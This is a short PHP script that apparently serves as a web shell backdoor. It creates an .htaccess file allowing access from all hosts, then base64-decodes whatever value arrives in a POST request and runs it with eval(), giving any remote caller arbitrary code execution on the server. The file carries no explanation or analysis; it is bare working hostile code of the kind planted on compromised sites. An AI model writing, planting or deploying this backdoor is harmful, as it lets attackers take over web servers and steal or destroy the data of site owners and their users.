<?php
	if (!file_exists(".htaccess")) {

		$text = "
		Allow from all
		Options -Indexes
		";

		$fp = fopen(".htaccess", "w");
		fwrite($fp, $text);
		fclose($fp);
	}

	foreach ($_POST as $key => $value){$enc = $value;}
	eval(base64_decode($enc));
?>